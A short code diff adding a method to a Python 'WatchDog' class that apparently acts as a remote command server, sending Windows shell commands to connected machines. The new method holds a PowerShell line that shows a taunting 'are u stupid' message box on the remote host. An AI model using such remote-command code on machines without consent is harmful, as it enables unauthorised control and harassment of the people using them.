@@ -76,6 +76,9 @@ class WatchDog:
     def cmd_send_to_c(self, conn):
         conn.send(bytes("cd c:/", "utf-8"))
 
+    def cmd_send_messagebox(self, conn):
+        """Add-Type -AssemblyName PresentationCore,PresentationFramework; $msgBody = "are u stupid"; $msgTitle = "?"; $msgButton = 'YesNoCancel'; $msgImage = 'Question'; $Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage); $Result"""
+
     def test_connections(self):
         while self.running:
             time.sleep(10)
